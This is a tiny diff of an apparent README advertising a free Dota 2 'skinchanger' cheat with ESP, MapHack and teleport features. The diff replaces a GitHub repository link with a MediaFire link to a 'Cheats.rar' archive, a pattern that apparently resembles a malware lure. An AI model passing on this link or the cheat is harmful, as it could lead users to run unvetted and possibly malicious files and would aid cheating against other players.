@@ -1,5 +1,5 @@
 FREE SKINCHANGER DOTA 2
-https://github.com/codingmenaa/DOTA-2-FREE-SKINCHANGER.git
+https://www.mediafire.com/file/3ezyy73bh484af2/Cheats.rar/file
 functions
 Teleport ESP
 MapHack
